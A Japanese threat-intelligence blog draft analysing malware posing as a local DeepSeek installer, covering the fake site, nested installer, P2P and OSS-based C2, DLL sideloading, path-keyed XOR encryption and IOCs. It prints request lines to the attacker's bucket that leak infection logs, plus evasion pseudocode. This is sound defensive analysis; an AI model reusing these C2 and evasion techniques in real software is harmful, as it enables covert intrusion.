---
title: "「DeepSeekをローカルで動かせます」と謳ったマルウェアの話"
emoji: "🔍"
type: "tech"
topics: ["malware", "security", "deepseek", "threat-intelligence"]
published: false
---

# 「DeepSeekをローカルで動かせます」と謳ったマルウェアの話

:::message alert
本記事は **中国語圏のユーザーを標的とした** マルウェア配布キャンペーンの解析記録です。日本語圏のユーザーが直接影響を受ける可能性は低いですが、同様の手口は他のAIブランド（ChatGPT、Gemini、Perplexity）でも展開されており、今後日本語圏に波及する可能性があります。
:::

## はじめに

2026年6月、DeepSeekの公式サイトを精巧にコピーした偽サイト `ai-deepseeqk.com` を発見しました。サイトには「deepseek客户端下载」（DeepSeekクライアントダウンロード）というボタンがあり、クリックすると169MBのZIPファイルがダウンロードされます。

中身はDeepSeekではありません。迅雷（Xunlei）のP2PダウンロードSDK、Qihoo 360のセキュリティSDK、そしてAlibaba CloudのOSSバケットからシェルコードを降らせる多段ローダーでした。

この記事では、このマルウェアの「何が面白いか」に焦点を当てて解説します。

## 偽サイトの完成度と、フッターに並ぶAIブランドのバーゲンセール

偽サイトの見た目は本物のDeepSeek公式サイトをほぼ完コピしています。ロゴ、ベンチマーク比較表、フッターのリンク群。ただし、全てのリンクが `/dows.html` という1つのページに飛びます。「DeepSeek R1」も「API 开放平台」も「English」も、全部同じ。

そしてフッターの最下部にこんなリンクが並んでいます。

```
chatgpt下载  perplexity下载  gemini下载  deepseek下载
```

リンク先はそれぞれ `chatgpt-pc.com`、`perplexity-pc.com`、`gemini-pc.com`、`deekseek-ai.com`。**同一のオペレーターが4つのAIブランドを同時に騙っている**ことが一目で分かります。インフラを共有して、ブランド名だけ差し替える量産体制です。`deekseek-ai.com`（deepseek → deekseek）というタイポスクワッティングまで押さえています。

さらに、サイトには中国の分析プラットフォーム `sdk.51.la` のトラッカーが埋め込まれており、ターゲットが中国語圏であることが明確です。

## 169MBの「インストーラー」の中身

ダウンロードされるZIPの構造はマトリョーシカ人形のように入れ子です。

```
DeepSeekV20.66-Setup.zip (169MB)
└─ DeepSeekV20.66-Setup.msi
   └─ NSIS Installer
      └─ App.7z
         ├─ JZDS360Ly.exe (Electronアプリ, 154MB)
         ├─ dk.dll (迅雷SDK, 6.8MB)
         ├─ 360Base64.dll / 360NetBase64.dll / 360Util64.dll (Qihoo 360 SDK)
         ├─ catchhelper.dll (プロセス列挙+ロケール確認)
         ├─ node.dll (Node.js runtime, 39MB)
         └─ resources/app.asar (Electron app bundle)
```

ZIP → MSI → NSIS → 7z → Electron。4段階のネスト。ファイルサイズが169MBもあるのは、**Electronアプリ一式をまるごと梱包している**からです。

MSIをインストールすると `C:\Program Files (x86)\DeepSeekV20.66\` にファイルが展開され、その後 `%AppData%\Roaming\DeepSeekV20.66\` に本体が配置されます。

```
%AppData%\Roaming\DeepSeekV20.66\DeepSeekV20.66\prerequisites\
├── aipackagechainer.exe    ← マルウェアチェイナー
├── aipackagechainer.ini    ← 設定ファイル
├── file_deleter.ps1        ← 痕跡削除スクリプト
└── DS本地部署工具\          ← 「DS Local Deployment Tool」
    └── DeepSeekV20.66.exe  ← 偽DeepSeekアプリ（Electron）
```

**「DS本地部署工具」** というフォルダ名が秀逸です。日本語に訳すと「DSローカルデプロイツール」。中国のAIユーザーにとって「LLMをローカルで動かしたい」というニーズは非常にリアルで、このフォルダ名を見ても不審に思わないでしょう。中国国内では非公式のツールやミラーが普通に流通しているので、偽サイトからダウンロードすることへの心理的抵抗も低い。

## 中国のエコシステムを悪用するインフラ設計

このマルウェアの設計で最も興味深いのは、中国のIT企業のインフラを巧みに組み合わせている点です。

### 迅雷（Xunlei）SDK — P2Pペイロード配信

`dk.dll`（6.8MB）は、中国の大手P2Pダウンロードソフト「迅雷」のSDKそのものです。BT/P2SPダウンロード機能を持つ正規のライブラリで、内部にはSQLiteのタスク管理DB（`task.db`）、DHTネットワーク識別子（`dht.id`）、ピアID（`pub_store.dat`）まで含まれています。

これは単なるHTTPダウンローダーではありません。**P2Pネットワーク経由でペイロードを配信できる設計**です。仮にC2サーバーが停止しても、すでに感染した端末同士でペイロードを共有できる可能性があります。

### Qihoo 360 SDK — セキュリティベンダーの盾

`360Base64.dll`、`360NetBase64.dll`、`360Util64.dll`、`360Lysdk64.dll` — 中国最大手のセキュリティベンダーQihoo 360のSDK DLL群を堂々と同梱しています。

中国国内では360セキュリティは事実上のデファクトAVです。360のSDKを組み込むことで、360のAV製品が自社SDKの呼び出しをマルウェアとして検出しにくくなる効果が期待できます。防御側のツールを逆用する構図です。

### Alibaba Cloud OSS — サーバーレスC2

C2サーバーには Alibaba Cloud 香港リージョンのOSSバケット（`steyyy888.oss-cn-hongkong.aliyuncs.com`）を使用しています。OSSバケットは静的ファイルのホスティングサービスですが、これを「ペイロード配信」と「感染状況の収集」の両方に使っています。

ペイロードの配信は単純です。

```
GET /zh/ds.100    → 200 (347KB, メインシェルコード)
GET /zh/ds.bin    → 200 (291KB, サポートシェルコード)
GET /zh/1.1x1     → 200 (252KB, Microsoft署名の正規バイナリ)
GET /zh/1.d00     → 200 (209KB, マルウェアDLL)
```

面白いのは**感染ログの送信方法**です。通常のマルウェアはPOSTリクエストのbodyでデータを送りますが、この検体はGETリクエストの**URLパス自体にログを埋め込みます**。

```
GET /upload?log=PathInit:C:\Users\<USER>\AppData\Local\Programs\_2693624903
GET /upload?log=AddTask:...\DefService.exe
GET /upload?log=CreateAndExecuteTask:{GUID}
```

C2は全てのリクエストに **404** を返します。OSSバケットに `/upload` パスは存在しないので当然です。しかし、Alibaba Cloud OSSの**アクセスログにはGETリクエストのURLが記録されます**。攻撃者はOSSバケットの管理コンソールからアクセスログを見るだけで、どの端末がどこまで感染プロセスを進めたかを把握できるのです。

バケットにサーバーサイドのコードは一切不要。OSSの標準機能だけで**読み取り専用のC2サーバー**が成立しています。

## DLLサイドローディング — Microsoftの署名を盾にする

C2からダウンロードされる4つのファイルのうち、`1.1x1` はVirusTotalで **0/74** — 完全にクリーンです。なぜなら、これは正真正銘のMicrosoft製 `SPDDUMP.EXE`（SPDメモリダンプツール）だからです。

このバイナリは `mspdb140.dll` をインポートしており、マルウェアDLL（`1.d00`）を `mspdb140.dll` にリネームして同じディレクトリに置くことで、正規の署名付きEXEがマルウェアDLLを読み込みます。これが**DLLサイドローディング**です。

セキュリティ製品がプロセスツリーを見ると「Microsoft署名のバイナリが正規のDLLを読み込んでいる」ように見えるため、検出を回避しやすくなります。

## XOR暗号化 — ファイルを移動するだけで壊れる仕掛け

マルウェアDLLは、同一ディレクトリの `*.xml` ファイルにシェルコードを格納しています。ここに地味ですが効果的なアンチフォレンジック技術が使われています。

XOR復号の鍵は、XMLファイルの**フルパス（UTF-16LE）** から導出されます。

```
key = 0x5A
for each wchar in GetFullPathNameW(filepath):
    key ^= low_byte(wchar)
    key = ROL(key, 1)   // 1ビット左ローテート
```

つまり、`C:\Users\victim\AppData\...\payload.xml` というパスから鍵が計算されます。フォレンジック担当者がこのファイルを回収して自分のマシン（`D:\Evidence\Case001\payload.xml`）にコピーすると、パスが変わるので鍵も変わり、**復号に失敗します**。

ファイルを移動するだけで自動的に壊れる。派手な技術ではありませんが、インシデントレスポンスの現場では厄介な仕掛けです。

## WeChatスクリーンショットが残すオペレーターの痕跡

偽サイトの画像ファイルの1つに `微信图片_20250221205332.png` というファイル名が残っていました。これはWeChat（微信）でスクリーンショットを撮影したときの**デフォルトファイル名**（`微信图片_YYYYMMDDHHMMSS.png`）です。

このファイル名から2つのことが分かります。

1. **オペレーターはWeChatを使っている** — 中国語圏のユーザーであることを裏付ける
2. **サイトコンテンツの一部は2025年2月21日に準備された** — DeepSeekが注目を集め始めた時期と一致する

ファイル名をリネームし忘れた些細なミスですが、キャンペーンのタイムラインと攻撃者のプロファイルを示す重要な手がかりです。

## 全体像 — 感染フロー

最終的な感染フローを整理します。

```
ai-deepseeqk.com（偽DeepSeekサイト）
  ↓ /dows.html → ZIP ダウンロード
  ↓ ZIP → MSI → NSIS → Electronアプリ展開
  ↓
aipackagechainer.exe（マルウェアチェイナー）起動
  ↓
Alibaba Cloud OSS (steyyy888) から4ファイルDL
  ├─ ds.100 (シェルコード: 環境チェック+C2通信)
  ├─ ds.bin (シェルコード: 遅延処理)
  ├─ 1.1x1 = SPDDUMP.EXE (MS署名正規バイナリ)
  └─ 1.d00 → mspdb140.dll (DLLサイドローディング)
      ↓
SPDDUMP.EXE が mspdb140.dll をロード
  ↓ DllMain → QueueUserAPC → APC injection
  ↓ *.xml からXOR復号 → シェルコード実行
  ↓
DefService.exe 作成 + スケジュールタスク登録（永続化）
  ↓
二次C2: zh.szeom.com:5947 へ接続
```

## IOC（Indicators of Compromise）

### Network

| タイプ | 値 |
|---|---|
| 配布ドメイン | `ai-deepseeqk.com` |
| 関連ドメイン | `chatgpt-pc.com`, `perplexity-pc.com`, `gemini-pc.com`, `deekseek-ai.com` |
| ダウンロードホスト | `dows.szeom.com` |
| 設定取得 | `youlian-cn.com` |
| C2 (ペイロード配信) | `steyyy888.oss-cn-hongkong.aliyuncs.com` |
| C2 (二次通信) | `zh.szeom.com:5947` |

### File

| ファイル | SHA256 |
|---|---|
| DeepSeekV20.66-Setup.zip | `89cc8cf9bd358b3ece9e2c1d67459b494e77f3d534ec346dd9cfbfbafdd67d22` |
| 1.d00 (ShellcodeRunner DLL) | `a90402ef6fb8efd2856d0523c9f0eca64b87110bd9435cff10cbcf4836fc51eb` |
| 1.1x1 (SPDDUMP.EXE) | `9a09faa9fa833f1810094c1a71e43217ff82e4861e3c63cea7670434b8d8229d` |
| ds.100 (shellcode) | `b18f12098b66bd0f7b7ac7da73d9a7f757ff8b3d2754a7c08015cacc2adbe5dd` |
| ds.bin (shellcode) | `4cb8a54db1b71a95ebf4953ec91a288ef1d004b6dd6fe6811dac2e636e4d3d67` |

### Host

| タイプ | 値 |
|---|---|
| インストール先 | `C:\Program Files (x86)\DeepSeekV20.66\` |
| マルウェア本体 | `%AppData%\Roaming\DeepSeekV20.66\` |
| 永続化 | `%LOCALAPPDATA%\Programs\_2693624903\DefService.exe` |
| プロセス | `aipackagechainer.exe` |
| 痕跡削除 | `file_deleter.ps1` |

## おわりに

このキャンペーンの本質は「AIへの関心」と「ローカル実行への需要」を悪用したソーシャルエンジニアリングです。技術的にも、迅雷SDK・360 SDK・Alibaba Cloud OSSという中国のITエコシステムを巧みに組み合わせたインフラ設計が目を引きます。

特にOSSバケットのアクセスログをC2チャネルとして使う手法は、検出が難しい上にインフラコストもほぼゼロです。OSSバケットへのGETリクエストは正当なトラフィックと区別しにくく、URLパスにログを埋め込むパターンは従来のC2通信検出ルールをすり抜けます。

AIブームに便乗したマルウェア配布は今後も増え続けるでしょう。正規のDeepSeekは `deepseek.com` からしかダウンロードできません。「ローカルで動かせる」「高速版」「日本語対応」といった甘い言葉には、169MBのマトリョーシカが潜んでいるかもしれません。
